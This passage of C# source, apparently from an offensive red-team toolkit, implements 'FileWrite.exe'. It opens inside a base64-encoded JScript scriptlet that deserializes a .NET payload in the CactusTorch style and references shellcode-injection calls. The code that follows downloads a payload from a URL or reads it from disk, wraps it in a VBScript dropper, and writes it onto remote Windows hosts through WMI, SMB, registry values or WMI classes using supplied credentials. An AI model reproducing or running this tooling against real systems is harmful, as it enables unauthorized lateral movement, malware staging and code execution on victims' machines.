1JQVFBQUFRMEExQU1CQUFTQUFBQUJBQUFBQUFBQUFBQUFBQUFBQVBjQUFBQUNBQUFBQUFBQUFBQUFBQUJSQUtrREFBQUEiKwoiQUFNQUFnQUVBQUlBQlFBQ0FBWUFBZ0FIQUFJQUNBQUNBQWtBQWdBQUFBQUFBSE5vWld4c1kyOWtaVE15QUdOaVVtVnpaWEoyWldReSIrCiJBR3h3VW1WelpYSjJaV1F5QUR4TmIyUjFiR1UrQUVOeVpXRjBaVkJ5YjJObGMzTkJBRU5TUlVGVVJWOUNVa1ZCUzBGWFFWbGZSbEpQIisKIlRWOUtUMElBUlZoRlExVlVSVjlTUlVGRUFFTlNSVUZVUlY5VFZWTlFSVTVFUlVRQVVGSlBRMFZUVTE5TlQwUkZYMEpCUTB0SFVrOVYiKwoiVGtSZlJVNUVBRVJWVUV4SlEwRlVSVjlEVEU5VFJWOVRUMVZTUTBVQVExSkZRVlJGWDBSRlJrRlZURlJmUlZKU1QxSmZUVTlFUlFCRCIrCiJVa1ZCVkVWZlRrVlhYME5QVGxOUFRFVUFSVmhGUTFWVVJWOVNSVUZFVjFKSlZFVUFSVmhGUTFWVVJRQlNSVk5GVWxaRkFFTkJRMVJWIisKIlUxUlBVa05JQUZkU1NWUkZYMWRCVkVOSUFGQklXVk5KUTBGTUFGQlNUMFpKVEVWZlMwVlNUa1ZNQUVOU1JVRlVSVjlRVWtWVFJWSlciKwoiUlY5RFQwUkZYMEZWVkVoYVgweEZWa1ZNQUVOU1JVRlVSVjlUU0VGU1JVUmZWMDlYWDFaRVRRQkRVa1ZCVkVWZlUwVlFRVkpCVkVWZiIrCiJWMDlYWDFaRVRRQlFVazlEUlZOVFgwMVBSRVZmUWtGRFMwZFNUMVZPUkY5Q1JVZEpUZ0JVVDFCZlJFOVhUZ0JIVHdCRFVrVkJWRVZmIisKIlRrVlhYMUJTVDBORlUxTmZSMUpQVlZBQVVGSlBSa2xNUlY5VlUwVlNBRkJTVDBaSlRFVmZVMFZTVmtWU0FFeEJVa2RGWDFCQlIwVlQiKwoiQUVOU1JVRlVSVjlHVDFKRFJVUlBVd0JKUkV4RlgxQlNTVTlTU1ZSWlgwTk1RVk5UQUZKRlFVeFVTVTFGWDFCU1NVOVNTVlJaWDBOTSIrCiJRVk5UQUVoSlIwaGZVRkpKVDFKSlZGbGZRMHhCVTFNQVFVSlBWa1ZmVGs5U1RVRk1YMUJTU1U5U1NWUlpYME5NUVZOVEFFSkZURTlYIisKIlgwNVBVazFCVEY5UVVrbFBVa2xVV1Y5RFRFRlRVd0JPVDBGRFEwVlRVd0JFVlZCTVNVTkJWRVZmVTBGTlJWOUJRME5GVTFNQVJFVlUiKwoiUVVOSVJVUmZVRkpQUTBWVFV3QkRVa1ZCVkVWZlVGSlBWRVZEVkVWRVgxQlNUME5GVTFNQVJFVkNWVWRmVUZKUFEwVlRVd0JFUlVKViIrCiJSMTlQVGt4WlgxUklTVk5mVUZKUFEwVlRVd0JTUlZORlZBQkRUMDFOU1ZRQVExSkZRVlJGWDBsSFRrOVNSVjlUV1ZOVVJVMWZSRVZHIisKIlFWVk1WQUJEVWtWQlZFVmZWVTVKUTA5RVJWOUZUbFpKVWs5T1RVVk9WQUJGV0ZSRlRrUkZSRjlUVkVGU1ZGVlFTVTVHVDE5UVVrVlQiKwoiUlU1VUFFTlNSVUZVUlY5T1QxOVhTVTVFVDFjQVpIZFlBRkpGUVVSUFRreFpBRVZZUlVOVlZFVmZWMUpKVkVWRFQxQlpBRWxPU0VWUyIrCiJTVlJmVUVGU1JVNVVYMEZHUmtsT1NWUlpBRWxPU0VWU1NWUmZRMEZNVEVWU1gxQlNTVTlTU1ZSWkFHUjNXUUIyWVd4MVpWOWZBR05pIisKIkFHMXpZMjl5YkdsaUFHeHdWR2h5WldGa1NXUUFaSGRVYUhKbFlXUkpaQUJrZDFCeWIyTmxjM05KWkFCRGNtVmhkR1ZTWlcxdmRHVlUiKwoiYUhKbFlXUUFhRlJvY21WaFpBQnNjRkpsYzJWeWRtVmtBSFZGZUdsMFEyOWtaUUJIWlhSRmJuWnBjbTl1YldWdWRGWmhjbWxoWW14bCIrCiJBR3h3U0dGdVpHeGxBR0pKYm1obGNtbDBTR0Z1Wkd4bEFHeHdWR2wwYkdVQWJIQkJjSEJzYVdOaGRHbHZiazVoYldVQVpteGhiV1VBIisKImJIQkRiMjF0WVc1a1RHbHVaUUJXWVd4MVpWUjVjR1VBWm14QmJHeHZZMkYwYVc5dVZIbHdaUUJIZFdsa1FYUjBjbWxpZFhSbEFFUmwiKwoiWW5WbloyRmliR1ZCZEhSeWFXSjFkR1VBUTI5dFZtbHphV0pzWlVGMGRISnBZblYwWlFCQmMzTmxiV0pzZVZScGRHeGxRWFIwY21saSIrCiJkWFJsQUVGemMyVnRZbXg1VkhKaFpHVnRZWEpyUVhSMGNtbGlkWFJsQUdSM1JtbHNiRUYwZEhKcFluVjBaUUJCYzNObGJXSnNlVVpwIisKImJHVldaWEp6YVc5dVFYUjBjbWxpZFhSbEFFRnpjMlZ0WW14NVEyOXVabWxuZFhKaGRHbHZia0YwZEhKcFluVjBaUUJCYzNObGJXSnMiKwoiZVVSbGMyTnlhWEIwYVc5dVFYUjBjbWxpZFhSbEFFWnNZV2R6UVhSMGNtbGlkWFJsQUVOdmJYQnBiR0YwYVc5dVVtVnNZWGhoZEdsdiIrCiJibk5CZEhSeWFXSjFkR1VBUVhOelpXMWliSGxRY205a2RXTjBRWFIwY21saWRYUmxBRUZ6YzJWdFlteDVRMjl3ZVhKcFoyaDBRWFIwIisKImNtbGlkWFJsQUVGemMyVnRZbXg1UTI5dGNHRnVlVUYwZEhKcFluVjBaUUJTZFc1MGFXMWxRMjl0Y0dGMGFXSnBiR2wwZVVGMGRISnAiKwoiWW5WMFpRQmtkMWhUYVhwbEFHUjNXVk5wZW1VQVpIZFRkR0ZqYTFOcGVtVUFaSGRUYVhwbEFGTnBlbVZQWmdCSFZVRlNSRjlOYjJScCIrCiJabWxsY21ac1lXY0FUazlEUVVOSVJWOU5iMlJwWm1sbGNtWnNZV2NBVjFKSlZFVkRUMDFDU1U1RlgwMXZaR2xtYVdWeVpteGhad0JHIisKImNtOXRRbUZ6WlRZMFUzUnlhVzVuQUZSdlUzUnlhVzVuQUdOaFkzUjFjMVJ2Y21Ob0FHZGxkRjlNWlc1bmRHZ0FUV0Z5YzJoaGJBQnIiKwoiWlhKdVpXd3pNaTVrYkd3QVEwRkRWRlZUVkU5U1EwZ3VaR3hzQUZONWMzUmxiUUJGYm5WdEFHeHdUblZ0WW1WeVQyWkNlWFJsYzFkeSIrCiJhWFIwWlc0QWJIQlFjbTlqWlhOelNXNW1iM0p0WVhScGIyNEFVM2x6ZEdWdExsSmxabXhsWTNScGIyNEFUV1Z0YjNKNVVISnZkR1ZqIisKImRHbHZiZ0JzY0ZOMFlYSjBkWEJKYm1adkFGcGxjbThBYkhCRVpYTnJkRzl3QUdKMVptWmxjZ0JzY0ZCaGNtRnRaWFJsY2dCb1UzUmsiKwoiUlhKeWIzSUFMbU4wYjNJQWJIQlRaV04xY21sMGVVUmxjMk55YVhCMGIzSUFTVzUwVUhSeUFGTjVjM1JsYlM1RWFXRm5ibTl6ZEdsaiIrCiJjd0JUZVhOMFpXMHVVblZ1ZEdsdFpTNUpiblJsY205d1UyVnlkbWxqWlhNQVUzbHpkR1Z0TGxKMWJuUnBiV1V1UTI5dGNHbHNaWEpUIisKIlpYSjJhV05sY3dCRVpXSjFaMmRwYm1kTmIyUmxjd0JpU1c1b1pYSnBkRWhoYm1Sc1pYTUFiSEJVYUhKbFlXUkJkSFJ5YVdKMWRHVnoiKwoiQUd4d1VISnZZMlZ6YzBGMGRISnBZblYwWlhNQVUyVmpkWEpwZEhsQmRIUnlhV0oxZEdWekFHUjNRM0psWVhScGIyNUdiR0ZuY3dCRCIrCiJjbVZoZEdWUWNtOWpaWE56Um14aFozTUFaSGRHYkdGbmN3QkVkWEJzYVdOaGRHVlBjSFJwYjI1ekFHUjNXRU52ZFc1MFEyaGhjbk1BIisKIlpIZFpRMjkxYm5SRGFHRnljd0JVWlhKdGFXNWhkR1ZRY205alpYTnpBR2hRY205alpYTnpBR3h3UW1GelpVRmtaSEpsYzNNQWJIQkIiKwoiWkdSeVpYTnpBR3h3VTNSaGNuUkJaR1J5WlhOekFFTnZibU5oZEFCUFltcGxZM1FBWm14UGJHUlFjbTkwWldOMEFHWnNVSEp2ZEdWaiIrCiJkQUJtYkU1bGQxQnliM1JsWTNRQWJIQkZiblpwY205dWJXVnVkQUJEYjI1MlpYSjBBR2hUZEdSSmJuQjFkQUJvVTNSa1QzVjBjSFYwIisKIkFIZFRhRzkzVjJsdVpHOTNBRlpwY25SMVlXeEJiR3h2WTBWNEFGWnBjblIxWVd4UWNtOTBaV04wUlhnQVltbHVZWEo1QUZkeWFYUmwiKwoiVUhKdlkyVnpjMDFsYlc5eWVRQnNjRU4xY25KbGJuUkVhWEpsWTNSdmNua0FiM0JmUlhGMVlXeHBkSGtBYjNCZlNXNWxjWFZoYkdsMCIrCiJlUUFBQVFBWlVBQnlBRzhBWndCeUFHRUFiUUJYQURZQU5BQXpBRElBQUExM0FHa0FiZ0JrQUdrQWNnQUFGVndBVXdCNUFITUFWd0JQIisKIkFGY0FOZ0EwQUZ3QUFCVmNBRk1BZVFCekFIUUFaUUJ0QURNQU1nQmNBQUFETUFBQUFCWmk4VVJ6L1JwQmtIQUxtWWZQK3I0QUJDQUIiKwoiQVFnRElBQUJCU0FCQVJFUkJDQUJBUTRFSUFFQkFnNEhDUjBGR0JJY0VSQU9HQmdJR0FVQUFSMEZEZ1FBQVE0T0F5QUFDQVlBQXc0TyIrCiJEZzRDQmhnRElBQU9CUUFDQWc0T0JBQUJDQndJdDNwY1ZoazA0SWtFQVFBQUFBUUNBQUFBQkFRQUFBQUVDQUFBQUFRUUFBQUFCQ0FBIisKIkFBQUVRQUFBQUFTQUFBQUFCQUFCQUFBRUFBSUFBQVFBQkFBQUJBQUlBQUFFQUJBQUFBUUFJQUFBQkFCQUFBQUVBSUFBQUFRQUFBRUEiKwoiQkFBQUFnQUVBQUFFQUFRQUFBZ0FCQUFBRUFBRUFBQWdBQVFBQUFBQkJBQUFBQUlFQUFBQUJBUUFBQUFJQkFBQUFCQUVBQUFBSUFRQSIrCiJBQUJBQkFBQUFJQUVBREFBQUFRQUFFQUFBZ1lJQWdZQ0FnWUpBd1lSRkFNR0VSZ0NCZ1lEQmhFZ0F3WVJKQk1BQ2hnT0RoSU1FZ3dDIisKIkVSUVlEaEljRUJFUUNnQUZHQmdZR0JFZ0VTUUpBQVVZR0JnWUVTUVlDUUFGQWhnWUhRVVlDQVVBQWdJWUNRb0FCeGdZR0FrWUdBa1kiKwoiQlNBQ0FRNE9DQUVBQ0FBQUFBQUFIZ0VBQVFCVUFoWlhjbUZ3VG05dVJYaGpaWEIwYVc5dVZHaHliM2R6QVFnQkFBSUFBQUFBQUJBQiIrCiJBQXREUVVOVVZWTlVUMUpEU0FBQUJRRUFBQUFBQlFFQUFRQUFLUUVBSkRVMk5UazRaakZqTFRaa09EZ3RORGs1TkMxaE16a3lMV0ZtIisKIk16TTNZV0psTlRjM053QUFEQUVBQnpFdU1DNHdMakFBQUFBQUFNUTFBQUFBQUFBQUFBQUFBTjQxQUFBQUlBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFEUU5RQUFBQUFBQUFBQUFBQUFBRjlEYjNKRWJHeE5ZV2x1QUcxelkyOXlaV1V1Wkd4c0FBQUFBQUQvSlFBZyIrCiJBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBRUFBQUFCZ0FBSUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBUUFBIisKIkFEQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUVnQUFBQllRQUFBTkFNQUFBQUFBQUFBQUFBQU5BTTBBQUFBVmdCVEFGOEEiKwoiVmdCRkFGSUFVd0JKQUU4QVRnQmZBRWtBVGdCR0FFOEFBQUFBQUwwRTcvNEFBQUVBQUFBQkFBQUFBQUFBQUFFQUFBQUFBRDhBQUFBQSIrCiJBQUFBQkFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFCRUFBQUFBUUJXQUdFQWNnQkdBR2tBYkFCbEFFa0FiZ0JtQUc4QUFBQUFBQ1FBIisKIkJBQUFBRlFBY2dCaEFHNEFjd0JzQUdFQWRBQnBBRzhBYmdBQUFBQUFBQUN3QkpRQ0FBQUJBRk1BZEFCeUFHa0FiZ0JuQUVZQWFRQnMiKwoiQUdVQVNRQnVBR1lBYndBQUFIQUNBQUFCQURBQU1BQXdBREFBTUFBMEFHSUFNQUFBQURBQURBQUJBRU1BYndCdEFHMEFaUUJ1QUhRQSIrCiJjd0FBQUVNQVFRQkRBRlFBVlFCVEFGUUFUd0JTQUVNQVNBQUFBQ0lBQVFBQkFFTUFid0J0QUhBQVlRQnVBSGtBVGdCaEFHMEFaUUFBIisKIkFBQUFBQUFBQUVBQURBQUJBRVlBYVFCc0FHVUFSQUJsQUhNQVl3QnlBR2tBY0FCMEFHa0Fid0J1QUFBQUFBQkRBRUVBUXdCVUFGVUEiKwoiVXdCVUFFOEFVZ0JEQUVnQUFBQXdBQWdBQVFCR0FHa0FiQUJsQUZZQVpRQnlBSE1BYVFCdkFHNEFBQUFBQURFQUxnQXdBQzRBTUFBdSIrCiJBREFBQUFCQUFCQUFBUUJKQUc0QWRBQmxBSElBYmdCaEFHd0FUZ0JoQUcwQVpRQUFBRU1BUVFCREFGUUFWUUJUQUZRQVR3QlNBRU1BIisKIlNBQXVBR1FBYkFCc0FBQUFQQUFNQUFFQVRBQmxBR2NBWVFCc0FFTUFid0J3QUhrQWNnQnBBR2NBYUFCMEFBQUFRd0JCQUVNQVZBQlYiKwoiQUZNQVZBQlBBRklBUXdCSUFBQUFLZ0FCQUFFQVRBQmxBR2NBWVFCc0FGUUFjZ0JoQUdRQVpRQnRBR0VBY2dCckFITUFBQUFBQUFBQSIrCiJBQUJJQUJBQUFRQlBBSElBYVFCbkFHa0FiZ0JoQUd3QVJnQnBBR3dBWlFCdUFHRUFiUUJsQUFBQVF3QkJBRU1BVkFCVkFGTUFWQUJQIisKIkFGSUFRd0JJQUM0QVpBQnNBR3dBQUFBNEFBd0FBUUJRQUhJQWJ3QmtBSFVBWXdCMEFFNEFZUUJ0QUdVQUFBQUFBRU1BUVFCREFGUUEiKwoiVlFCVEFGUUFUd0JTQUVNQVNBQUFBRFFBQ0FBQkFGQUFjZ0J2QUdRQWRRQmpBSFFBVmdCbEFISUFjd0JwQUc4QWJnQUFBREVBTGdBdyIrCiJBQzRBTUFBdUFEQUFBQUE0QUFnQUFRQkJBSE1BY3dCbEFHMEFZZ0JzQUhrQUlBQldBR1VBY2dCekFHa0Fid0J1QUFBQU1RQXVBREFBIisKIkxnQXdBQzRBTUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQURBQUFBd0FBQUR3TlFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFCRFFBQUFBUUFBQUFKRndBQUFBa0dBQUFBQ1JZQUFBQUdHZ0FBQUNkVGVYTjBaVzB1VW1WbWJHVmpkR2x2IisKImJpNUJjM05sYldKc2VTQk1iMkZrS0VKNWRHVmJYU2tJQUFBQUNnc0EiOwp2YXIgZW50cnlfY2xhc3MgPSAnY2FjdHVzVG9yY2gnOwoKdHJ5IHsKCXNldHZlcnNpb24oKTsKCXZhciBzdG0gPSBiYXNlNjRUb1N0cmVhbShzZXJpYWxpemVkX29iaik7Cgl2YXIgZm10ID0gbmV3IEFjdGl2ZVhPYmplY3QoJ1N5c3RlbS5SdW50aW1lLlNlcmlhbGl6YXRpb24uRm9ybWF0dGVycy5CaW5hcnkuQmluYXJ5Rm9ybWF0dGVyJyk7Cgl2YXIgYWwgPSBuZXcgQWN0aXZlWE9iamVjdCgnU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCcpOwoJdmFyIG4gPSBmbXQuU3Vycm9nYXRlU2VsZWN0b3I7Cgl2YXIgZCA9IGZtdC5EZXNlcmlhbGl6ZV8yKHN0bSk7CglhbC5BZGQobik7Cgl2YXIgbyA9IGQuRHluYW1pY0ludm9rZShhbC5Ub0FycmF5KCkpLkNyZWF0ZUluc3RhbmNlKGVudHJ5X2NsYXNzKTsKCW8uZmxhbWUoYmluYXJ5LGNvZGUpOwp9IGNhdGNoIChlKSB7CiAgICBkZWJ1ZyhlLm1lc3NhZ2UpOwp9Cl1dPjwvc2NyaXB0PgogICAgPC9yZWdpc3RyYXRpb24+CiAgPC9jb21wb25lbnQ+CjwvcGFja2FnZT4=";
                if(dtype == "flat")
                {
                    String finalpay = String.Format("Dim pLoad, fnames, droploc\npLoad =\"{0}\"\nfnames = \"{1}\"\ndroploc = \"{2}\"\n", plfile, fname, droploc);
                    vbsp = vbsp.Insert(0, finalpay);
                }
                else if (dtype == "nonflat")
                {
                    datavals = plfile;
                }
            }
            else
            {
                if (uricheck)
                {
                    try
                    {
                        WebClient webcl = new WebClient();
                        //May want to change this
                        webcl.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        byte[] filedata = webcl.DownloadData(paylocation);
                        string plfile = Convert.ToBase64String(filedata);
                        if (dtype == "flat")
                        {
                            String finalpay = String.Format("Dim pLoad, fnames, droploc\npLoad =\"{0}\"\nfnames = \"{1}\"\ndroploc = \"{2}\"\n", plfile, fname, droploc);
                            vbsp = vbsp.Insert(0, finalpay);
                        }
                        else if (dtype == "nonflat")
                        {
                            datavals = plfile;
                        }
                    }
                    catch (WebException)
                    {
                        Console.WriteLine("[X] URL doesnt exist");
                        return;
                    }
                }
                else
                {
                    try
                    {
                        Byte[] plbytes = File.ReadAllBytes(paylocation);
                        String plfile = Convert.ToBase64String(plbytes);
                        if(dtype == "flat")
                        {
                            String finalpay = String.Format("Dim pLoad, fnames, droploc\npLoad =\"{0}\"\nfnames = \"{1}\"\ndroploc = \"{2}\"\n", plfile, fname, droploc);
                            vbsp = vbsp.Insert(0, finalpay);
                        }
                        else if (dtype == "nonflat")
                        {
                            datavals = plfile;
                        }
                    }
                    catch (IOException)
                    {
                        Console.WriteLine("[X] File doesnt exist");
                        return;
                    }
                }
            }
        }

        static void Usage()
        {
            Console.WriteLine("\n  Write Files");
            Console.WriteLine("");
            Console.WriteLine("   FileWrite.exe computername=host.domain.local writetype=wmi eventname=TestTask location=local droplocation=\"C:\\Windows\\Temp\" filename=move.exe");
            Console.WriteLine("   FileWrite.exe computername=host.domain.local writetype=smb droplocation=\"C:\\Windows\\Temp\" filename=move.exe");

        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string username = "";
            string password = "";

            if (arguments.ContainsKey("username"))
            {
                if (!arguments.ContainsKey("password"))
                {
                    Usage();
                    return;
                }
                else
                {
                    username = arguments["username"];
                    password = arguments["password"];
                }
            }
            if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
            {
                Usage();
                return;
            }
            if (arguments.ContainsKey("computername"))
            {
                string[] computerNames = arguments["computername"].Split(',');
                string eventName = "Debug";
                string location = "local";
                string droplocation = @"C:\Windows\Temp";
                string wnamespace = "root\\CIMv2";
                string filename = string.Empty;
                string valuename = string.Empty;
                string keypath = string.Empty;
                string classname = string.Empty;
                foreach (string computerName in computerNames)
                {
                    if (arguments.ContainsKey("eventname"))
                    {
                        eventName = arguments["eventname"];
                    }
                    if (arguments.ContainsKey("location"))
                    {
                        location = arguments["location"];
                    }
                    if (arguments.ContainsKey("droplocation"))
                    {
                        droplocation = arguments["droplocation"];
                    }
                    if (arguments.ContainsKey("filename"))
                    {
                        filename = arguments["filename"];
                    }
                    if (arguments.ContainsKey("classname"))
                    {
                        classname = arguments["classname"];
                    }
                    if (arguments.ContainsKey("keypath"))
                    {
                        keypath = arguments["keypath"];
                    }
                    if (arguments.ContainsKey("valuename"))
                    {
                        valuename = arguments["valuename"];
                    }
                    if (arguments.ContainsKey("wminamespace"))
                    {
                        wnamespace = arguments["wminamespace"];
                    }

                    if (arguments.ContainsKey("writetype"))
                    {
                        if (arguments["writetype"].ToLower() == "wmi")
                        {
                            GetFileContent(location, droplocation, filename, "flat");
                            WriteToFileWMI(computerName, eventName, username, password);
                        }
                        else if (arguments["writetype"].ToLower() == "smb")
                        {
                            WriteToFileSMB(computerName, droplocation, filename, location);
                        }
                        else if(arguments["writetype"].ToLower() == "registry")
                        {
                            if (valuename == string.Empty)
                            {
                                Console.WriteLine("[-] Valuename is required");
                                return;
                            }
                            GetFileContent(location, droplocation, filename, "nonflat");
                            WriteToRegKey(computerName, username, password, keypath, valuename);
                        }
                        else if (arguments["writetype"].ToLower() == "wmiclass")
                        {
                            GetFileContent(location, droplocation, filename, "nonflat");
                            WriteToWMIClass(computerName, username, password, wnamespace, classname);
                        }
                        else if (arguments["writetype"].ToLower() == "removewmiclass")
                        {
                            RemoveWMIClass(computerName, username, password, wnamespace, classname);
                        }
                        else if (arguments["writetype"].ToLower() == "removeregkey")
                        {
                            RemoveRegValue(computerName, username, password, keypath, valuename);
                        }
                        else
                        {
                            Usage();
                            return;
                        }
                    }
                    else
                    {
                        Usage();
                    }
                }
            }
            else
            {
                Usage();
                return;
            }
        }
    }
}
